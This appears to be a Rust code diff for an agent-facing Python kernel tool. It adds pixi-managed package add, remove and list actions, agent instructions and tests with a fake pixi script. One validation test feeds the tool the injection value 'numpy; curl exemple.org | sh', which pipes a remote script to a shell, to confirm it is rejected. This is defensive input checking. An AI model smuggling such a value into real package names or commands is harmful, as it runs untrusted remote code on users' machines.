@@ -3,6 +3,7 @@
 //! `atelier-kernel` ; ce module le relie aux fils, au pont MCP et au bus.
 
 use crate::state::AppState;
+use atelier_kernel::pixi::ChangeKind;
 use atelier_kernel::usage::human_bytes;
 use atelier_kernel::{CellEvent, KernelStatus, RunRequest};
 use atelier_protocol::agent_mcp_limits as lim;
@@ -114,9 +115,9 @@ async fn dispatch(
     let thread = crate::delegation::fil_du_noyau(state, &appelant).await;
     let caller_id = thread.id.as_str();
     let kernels = state.kernels();
-    // Lire ce qui existe reste permis noyau coupé : le journal et la liste
-    // des envs ne lancent rien.
-    if !enabled(Some(&thread)) && !matches!(action, "kernel_envs" | "kernel_status") {
+    // Lire ce qui existe reste permis noyau coupé : le journal, la liste des
+    // envs et celle des paquets ne lancent pas de noyau.
+    if !enabled(Some(&thread)) && !matches!(action, "kernel_envs" | "kernel_status" | "kernel_packages") {
         // Couper l'interrupteur arrête aussi un noyau resté en vie.
         kernels.shutdown(caller_id).await;
         return Err(OFF_MESSAGE.into());
@@ -228,7 +229,30 @@ L'utilisateur peut changer de mode dans le compositeur."
                 "current": current,
                 "remembered": default_env,
                 "default": envs.first().map(|e| e.name.clone()),
+                "atelier": atelier_env_view(state),
             })
+        }
+        "kernel_add" | "kernel_remove" => {
+            if read_only(&appelant) {
+                return Err("kernel_read_only — le fil est en mode lecture seule : les paquets de l'env ne se modifient pas. \
+L'utilisateur peut changer de mode dans le compositeur."
+                    .into());
+            }
+            let kind = if action == "kernel_add" { ChangeKind::Add } else { ChangeKind::Remove };
+            let specs = package_list(req)?;
+            let pypi = req.get("pypi").and_then(Value::as_bool).unwrap_or(false);
+            let root = (!thread.project_root.is_empty() && cwd.is_dir()).then(|| cwd.as_path());
+            let target = kernels.target_env(caller_id, root, env, default_env)?;
+            change_packages(state, caller_id, target, kind, specs, pypi, wait).await?
+        }
+        "kernel_packages" => {
+            let root = (!thread.project_root.is_empty() && cwd.is_dir()).then(|| cwd.as_path());
+            let target = kernels.target_env(caller_id, root, env, default_env)?;
+            let mut out = kernels.packages(caller_id, &target).await?;
+            if let Some(operation) = kernels.pixi().change_view(caller_id) {
+                out["operation"] = operation;
+            }
+            out
         }
         "kernel_status" => {
             let status = kernels.status(caller_id);
@@ -297,6 +321,83 @@ fn memory_line(status: &KernelStatus) -> Option<String> {
         "Le noyau occupe {} de mémoire résidente{who}{machine}.",
         human_bytes(rss)
     ))
+}
+
+/// Ce que l'action `envs` dit de l'env « atelier » : où il vit, s'il est
+/// déjà créé, et pixi (ou la ligne pour l'installer).
+fn atelier_env_view(state: &AppState) -> Value {
+    let pixi = state.kernels().pixi();
+    let dir = pixi.atelier_dir();
+    let mut view = json!({
+        "name": atelier_kernel::pixi::ATELIER_ENV,
+        "dir": dir,
+        "installed": atelier_kernel::pixi::env_prefix(dir).join("bin/python").is_file(),
+        "pixi": pixi.binary(),
+    });
+    if view["pixi"].is_null() {
+        view["install"] = json!(atelier_kernel::pixi::INSTALL_LINE);
+        view["note"] = json!(atelier_kernel::pixi::missing_message());
+    }
+    view
+}
+
+/// `packages` de l'outil : une liste de noms (un nom seul passe aussi).
+/// La validation stricte de chaque nom se fait dans `atelier-kernel`.
+fn package_list(req: &Value) -> Result<Vec<String>, String> {
+    const MISSING: &str = "kernel_missing_packages — passe les noms dans packages, par exemple [\"xarray\", \"numpy>=2.1\"].";
+    match req.get("packages") {
+        Some(Value::String(one)) => Ok(vec![one.clone()]),
+        Some(Value::Array(list)) if !list.is_empty() => list
+            .iter()
+            .map(|v| v.as_str().map(str::to_string).ok_or_else(|| MISSING.to_string()))
+            .collect(),
+        _ => Err(MISSING.into()),
+    }
+}
+
+/// `add` ou `remove` : pixi tourne en tâche de fond (une installation lourde
+/// dépasse le délai du pont) ; l'appel attend au plus `wait`, puis rend
+/// « running » et l'agent suit la fin avec l'action `packages`.
+async fn change_packages(
+    state: &AppState,
+    thread_id: &str,
+    env: atelier_kernel::PyEnv,
+    kind: ChangeKind,
+    specs: Vec<String>,
+    pypi: bool,
+    wait: Duration,
+) -> Result<Value, String> {
+    state.kernels().pixi().begin_change(thread_id, kind, &specs)?;
+    let (task_state, id, task_specs) = (state.clone(), thread_id.to_string(), specs.clone());
+    let mut task = tokio::spawn(async move {
+        let mut result = task_state
+            .kernels()
+            .change_packages(&id, &env, kind, &task_specs, pypi)
+            .await;
+        // Les noyaux dont l'instantané d'env vient d'être repris : leur
+        // état (paquets, empreinte) a changé pour le panneau.
+        if let Ok(value) = &mut result {
+            let kernels = value.as_object_mut().and_then(|o| o.remove("kernels"));
+            for thread in kernels.iter().flat_map(|k| k.as_array()).flatten().filter_map(Value::as_str) {
+                publish_status(&task_state, thread);
+            }
+        }
+        task_state.kernels().pixi().end_change(&id, result.clone());
+        result
+    });
+    match tokio::time::timeout(wait, &mut task).await {
+        Ok(joined) => {
+            // Résultat rendu tout de suite : rien à suivre plus tard.
+            state.kernels().pixi().forget_change(thread_id);
+            joined.map_err(|e| e.to_string())?
+        }
+        Err(_) => Ok(json!({
+            "status": "running",
+            "action": kind.verb(),
+            "packages": specs,
+            "hint": "pixi travaille encore en arrière-plan (résolution, téléchargement). Rappelle l'outil avec action=packages : son champ operation dit quand c'est fini. N'importe pas le paquet avant.",
+        })),
+    }
 }
 
 fn read_only(thread: &atelier_store::Thread) -> bool {
@@ -368,7 +469,7 @@ pub async fn handle_command(state: &AppState, msg: &Value) -> Vec<String> {
     let thread_id = msg.get("threadId").and_then(Value::as_str).unwrap_or("");
     let op = msg.get("op").and_then(Value::as_str).unwrap_or("");
     let result = match op {
-        "variables" | "interrupt" | "restart" | "envs" => {
+        "variables" | "interrupt" | "restart" | "envs" | "packages" | "add" | "remove" => {
             dispatch(state, thread_id, &format!("kernel_{op}"), msg, true).await
         }
         "link" => link_file(state, thread_id, msg).await,
@@ -859,6 +960,8 @@ async fn link_file(state: &AppState, thread_id: &str, msg: &Value) -> Result<Val
 pub async fn on_delete_thread(state: &AppState, thread_id: &str) {
     state.kernels().shutdown(thread_id).await;
     state.kernels().journal().delete_thread(thread_id);
+    atelier_kernel::pixi::delete_package_changes(state.kernels().kernel_dir(), thread_id);
+    state.kernels().pixi().forget_change(thread_id);
     let _ = std::fs::remove_dir_all(state.kernels().figures_dir(thread_id));
 }
 
@@ -897,8 +1000,18 @@ For Python analysis, run your code with the MCP tool `atelier_python` (action \"
 `python -c` or scripts in the shell: variables, loaded data and imports stay in memory between calls, \
 like a Jupyter notebook, and every cell is logged with the files it read and wrote. Load data once, \
 then work on it in later cells; keep each cell focused. The kernel starts on the first run, in the \
-project folder. Pick the env once with `env` on that first run (action \"envs\" lists them, conda and \
-Claude Science envs included); use \"restart\" with another env to switch.{env} A cell that runs longer \
+project folder, in the default env: the project's own env when it has one (pixi.toml or .venv), otherwise \
+the single shared env \"atelier\" that the app manages with pixi (one env and one lock file for all \
+analyses). Do not pass `env` unless the user asks for a specific one: action \"envs\" lists them (conda \
+and Claude Science envs stay usable on request), and \"restart\" with another env switches.{env} When a \
+package is missing, add it with action \"add\" (`packages`: conda-forge names, with an optional version \
+such as \"numpy>=2.1\"; set `pypi` to true only for a package conda-forge does not have); \"remove\" \
+takes names the same way and \"packages\" shows what is installed. A package you just added can be \
+imported in the next cell without a restart, unless the tool says otherwise. Never install packages or \
+create an env yourself, in the shell or in a cell (`pip install`, `conda install`, `conda create`, \
+`pixi add`, `uv pip install`, `python -m venv`): the env's lock file is part of the provenance of every \
+file a cell writes, and a package installed behind its back breaks it. If the tool says pixi is missing, \
+tell the user the install line it gives; do not install it yourself. A cell that runs longer \
 than ~45 s returns status \"running\": call action \"wait\" with its cell number, or \"interrupt\". Save \
 figures with savefig (the backend is Agg) and leave them open (no plt.close()): the matplotlib figures still open \
 when a cell ends are captured as PNG, and the first {figures} of a cell come back to you as images in the tool \
@@ -1480,5 +1593,240 @@ sys.modules["matplotlib.pyplot"] = plt
         assert!(block.contains("Cells 1–2 re-run here from the earlier thread « Albédo 2024 »"), "{block}");
         assert!(block.contains("b * 2"), "{block}");
         state.kernels().shutdown("neuf").await;
+    }
+
+    #[test]
+    fn la_consigne_envoie_les_paquets_vers_l_action_add() {
+        let on = fil(json!({"kernelEnabled": true}), Some("s1"));
+        let (bloc, _) = announcement(Some(&on), "claude").unwrap();
+        for attendu in [
+            "shared env \"atelier\"",
+            "action \"add\"",
+            "Never install packages or create an env yourself",
+            "`pip install`",
+            "`conda create`",
+            "Do not pass `env` unless the user asks",
+        ] {
+            assert!(bloc.contains(attendu), "« {attendu} » manque dans la consigne : {bloc}");
+        }
+    }
+
+    /// Faux pixi : `install` crée l'env (`bin/python` y lance `python` s'il
+    /// est donné), `add` et `remove` y posent ou retirent un dist-info, `list`
+    /// rend ce qui s'y trouve. Le paquet « lent » met une seconde à venir.
+    fn faux_pixi(dir: &Path, python: Option<&str>) -> PathBuf {
+        use std::io::Write;
+        let python = python.unwrap_or_default();
+        let script = format!(
+            r#"#!/bin/sh
+[ "$1" = "--version" ] && {{ echo "pixi 0.0.0-faux"; exit 0; }}
+verbe="$1"; shift; projet=""; noms=""
+while [ $# -gt 0 ]; do
+  case "$1" in --manifest-path) projet="$2"; shift ;; --color) shift ;; --) shift; noms="$*"; break ;; esac
+  shift
+done
+env="$projet/.pixi/envs/default"; site="$env/lib/python3.12/site-packages"
+case "$verbe" in
+  install)
+    mkdir -p "$env/bin" "$site"
+    if [ -e "$env/bin/python" ]; then :
+    elif [ -n "{python}" ]; then printf '#!/bin/sh\nexec "%s" "$@"\n' "{python}" > "$env/bin/python"; chmod +x "$env/bin/python"
+    else : > "$env/bin/python"; fi ;;
+  add) for n in $noms; do [ "$n" = lent ] && sleep 1; mkdir -p "$site/$n-1.0.dist-info"; done ;;
+  remove) for n in $noms; do rm -rf "$site/$n-1.0.dist-info"; done ;;
+  list)
+    printf '['; sep=""
+    for d in "$site"/*.dist-info; do
+      [ -d "$d" ] || continue
+      printf '%s{{"name":"%s","version":"1.0","kind":"conda","is_explicit":true}}' "$sep" "$(basename "$d" -1.0.dist-info)"; sep=","
+    done
+    printf ']\n'; exit 0 ;;
+esac
+ls "$site" > "$projet/pixi.lock"
+"#
+        );
+        // Écrit par un `sh`, pas par ce processus : un `fork` d'un autre test
+        // pendant l'écriture garderait le fichier ouvert, et son lancement
+        // échouerait (« Text file busy »).
+        let path = dir.join("pixi");
+        let mut sh = std::process::Command::new("/bin/sh")
+            .args(["-c", "cat > \"$1\" && chmod 755 \"$1\"", "sh"])
+            .arg(&path)
+            .stdin(std::process::Stdio::piped())
+            .spawn()
+            .unwrap();
+        sh.stdin.take().unwrap().write_all(script.as_bytes()).unwrap();
+        assert!(sh.wait().unwrap().success());
+        path
+    }
+
+    fn etat(dir: &Path) -> AppState {
+        AppState::new(
+            crate::paths::AppPaths::from_app_dir(dir.to_path_buf()),
+            None,
+            "t".into(),
+            "0.1.0".into(),
+            "hash".into(),
+            "/tmp".into(),
+        )
+    }
+
+    async fn regler(state: &AppState, fil: Value) {
+        state.threads().lock().await.upsert(fil, false).unwrap();
+    }
+
+    #[tokio::test]
+    async fn les_paquets_de_l_env_atelier_passent_par_l_outil() {
+        let dir = tempfile::tempdir().unwrap();
+        let outils = tempfile::tempdir().unwrap();
+        let projet = tempfile::tempdir().unwrap();
+        let state = etat(dir.path());
+        state.kernels().pixi().set_binary(Some(faux_pixi(outils.path(), None)));
+        let root = projet.path().display().to_string();
+        regler(&state, json!({"id": "fil", "projectRoot": root, "provider": "codex"})).await;
+        let ajouter = json!({"packages": ["xarray", "rasterio"]});
+
+        // Noyau coupé : la liste se lit, rien ne se modifie.
+        let liste = action(&state, "fil", "kernel_packages", &json!({})).await.unwrap();
+        assert_eq!(liste["env"]["name"], "atelier", "{liste}");
+        assert_eq!((&liste["managed"], &liste["installed"]), (&json!(true), &json!(false)));
+        let off = action(&state, "fil", "kernel_add", &ajouter).await.unwrap_err();
+        assert!(off.starts_with("kernel_disabled"), "{off}");
+        assert!(!dir.path().join("python").exists(), "rien n'est créé avant le premier usage");
+
+        regler(&state, json!({"id": "fil", ENABLED_KEY: true})).await;
+        let envs = action(&state, "fil", "kernel_envs", &json!({})).await.unwrap();
+        assert_eq!(envs["default"], "atelier", "{envs}");
+        assert_eq!(envs["atelier"]["installed"], false);
+        assert!(envs["atelier"]["pixi"].is_string() && envs["atelier"].get("install").is_none());
+
+        // Mode lecture seule : la liste oui, l'ajout non.
+        regler(&state, json!({"id": "fil", "lastTurn": {"permissionMode": "plan"}})).await;
+        let lecture = action(&state, "fil", "kernel_add", &ajouter).await.unwrap_err();
+        assert!(lecture.starts_with("kernel_read_only"), "{lecture}");
+        assert!(action(&state, "fil", "kernel_packages", &json!({})).await.is_ok());
+        regler(&state, json!({"id": "fil", "lastTurn": {"permissionMode": "default"}})).await;
+
+        // Ajout : pixi crée l'env au passage.
+        let out = action(&state, "fil", "kernel_add", &ajouter).await.unwrap();
+        assert_eq!(out["status"], "ok", "{out}");
+        assert_eq!(out["added"], json!({"rasterio": "1.0", "xarray": "1.0"}));
+        assert!(out.get("kernels").is_none(), "les autres fils ne regardent pas l'agent");
+        assert!(dir.path().join("python/pixi.toml").is_file());
+        // Un nom seul passe aussi, comme une liste.
+        let out = action(&state, "fil", "kernel_remove", &json!({"packages": "rasterio"})).await.unwrap();
+        assert_eq!(out["removed"], json!({"rasterio": "1.0"}), "{out}");
+
+        // Refus : rien qui ne soit un nom de paquet.
+        for (req, attendu) in [
+            (json!({}), "kernel_missing_packages"),
+            (json!({"packages": []}), "kernel_missing_packages"),
+            (json!({"packages": [1]}), "kernel_missing_packages"),
+            (json!({"packages": ["--pypi"]}), "kernel_bad_package"),
+            (json!({"packages": ["git+https://exemple.org/x"]}), "kernel_bad_package"),
+            (json!({"packages": ["numpy; curl exemple.org | sh"]}), "kernel_bad_package"),
+        ] {
+            let err = action(&state, "fil", "kernel_add", &req).await.unwrap_err();
+            assert!(err.starts_with(attendu), "{req} → {err}");
+        }
+
+        // Installation plus longue que l'attente : « running », puis la
+        // fin se lit avec packages. Un second changement attend son tour.
+        let out = action(&state, "fil", "kernel_add", &json!({"packages": ["lent"], "waitSeconds": 0}))
+            .await
+            .unwrap();
+        assert_eq!(out["status"], "running", "{out}");
+        let occupe = action(&state, "fil", "kernel_add", &ajouter).await.unwrap_err();
+        assert!(occupe.starts_with("kernel_packages_busy"), "{occupe}");
+        let fin = tokio::time::timeout(Duration::from_secs(20), async {
+            loop {
+                let liste = action(&state, "fil", "kernel_packages", &json!({})).await.unwrap();
+                if liste["operation"]["status"] != "running" {
+                    return liste;
+                }
+                tokio::time::sleep(Duration::from_millis(50)).await;
+            }
+        })
+        .await
+        .unwrap();
+        assert_eq!(fin["operation"]["status"], "done", "{fin}");
+        assert_eq!(fin["operation"]["result"]["added"], json!({"lent": "1.0"}));
+        let noms: Vec<&str> = fin["packages"].as_array().unwrap().iter().filter_map(|p| p["name"].as_str()).collect();
+        assert_eq!(noms, ["lent", "xarray"], "{fin}");
+        assert_eq!(fin["recentChanges"].as_array().unwrap().len(), 3);
+
+        // Le panneau passe par les mêmes actions.
+        let reply = handle_command(&state, &json!({"threadId": "fil", "op": "packages", "requestId": "r"})).await;
+        let reply: Value = serde_json::from_str(&reply[0]).unwrap();
+        assert_eq!(reply["result"]["total"], 2, "{reply}");
+
+        // Un env qui n'est pas celui d'Atelier ne se modifie pas d'ici.
+        let ailleurs = outils.path().join("python-a-moi");
+        std::fs::write(&ailleurs, "").unwrap();
+        regler(&state, json!({"id": "autre", "projectRoot": root, "provider": "codex",
+                               ENABLED_KEY: true, ENV_KEY: ailleurs.display().to_string()})).await;
+        let refus = action(&state, "autre", "kernel_add", &ajouter).await.unwrap_err();
+        assert!(refus.starts_with("kernel_env_not_managed"), "{refus}");
+        // Sauf à le demander : l'env d'Atelier se désigne par son nom.
+        let out = action(&state, "autre", "kernel_add", &json!({"packages": ["netcdf4"], "env": "atelier"}))
+            .await
+            .unwrap();
+        assert_eq!(out["added"], json!({"netcdf4": "1.0"}), "{out}");
+
+        // pixi absent : l'erreur donne la ligne d'installation.
+        state.kernels().pixi().set_binary(None);
+        let sans = action(&state, "autre", "kernel_add", &ajouter).await.unwrap_err();
+        assert!(sans.contains(atelier_kernel::pixi::INSTALL_LINE), "{sans}");
+        let envs = action(&state, "fil", "kernel_envs", &json!({})).await.unwrap();
+        assert_eq!(envs["atelier"]["install"], atelier_kernel::pixi::INSTALL_LINE, "{envs}");
+
+        // Fil supprimé : sa trace de paquets part avec lui.
+        let kernel_dir = state.kernels().kernel_dir().to_path_buf();
+        assert_eq!(atelier_kernel::pixi::package_changes(&kernel_dir, "fil").len(), 3);
+        on_delete_thread(&state, "fil").await;
+        assert!(atelier_kernel::pixi::package_changes(&kernel_dir, "fil").is_empty());
+    }
+
+    #[tokio::test]
+    async fn sans_env_demande_le_noyau_prend_l_env_atelier() {
+        let Some(py) = python() else {
+            return;
+        };
+        let dir = tempfile::tempdir().unwrap();
+        let outils = tempfile::tempdir().unwrap();
+        let projet = tempfile::tempdir().unwrap();
+        let state = etat(dir.path());
+        state.kernels().pixi().set_binary(Some(faux_pixi(outils.path(), Some(py.as_str()))));
+        let root = projet.path().display().to_string();
+        const FIL: &str = "fil";
+        regler(&state, json!({"id": FIL, "projectRoot": root, "provider": "codex", ENABLED_KEY: true})).await;
+
+        let out = action(&state, FIL, "kernel_run", &json!({"code": "x = 6 * 7\nx"})).await.unwrap();
+        assert_eq!(out["cell"]["result"], "42", "{out}");
+        assert!(out["note"].as_str().unwrap().contains("« atelier »"), "{out}");
+        let fil = state.threads().lock().await.get(FIL).cloned().unwrap();
+        assert_eq!(fil.extra.get(ENV_KEY), Some(&json!("atelier")));
+        let avant = state.kernels().status(FIL).env_sha256;
+
+        // Ajout sous un noyau vivant : son état est republié avec la
+        // nouvelle empreinte d'env, et il ne redémarre pas.
+        let mut bus = state.subscribe_bus();
+        let out = action(&state, FIL, "kernel_add", &json!({"packages": ["xarray"]})).await.unwrap();
+        assert_eq!(out["restartNeeded"], false, "{out}");
+        let apres = state.kernels().status(FIL).env_sha256;
+        assert_ne!(apres, avant);
+        let mut publie = None;
+        while let Ok(msg) = bus.try_recv() {
+            let v: Value = serde_json::from_str(&msg).unwrap();
+            if v["type"] == "kernelStatus" && v["threadId"] == FIL {
+                publie = v["status"]["envSha256"].as_str().map(str::to_string);
+            }
+        }
+        assert_eq!(publie, apres);
+        let out = action(&state, FIL, "kernel_run", &json!({"code": "x + 1"})).await.unwrap();
+        assert_eq!(out["cell"]["result"], "43", "{out}");
+        assert!(out.get("note").is_none(), "même noyau : {out}");
+        assert_eq!(state.kernels().journal().get(FIL, 2).unwrap().env_sha256, apres);
+        state.kernels().shutdown(FIL).await;
     }
 }
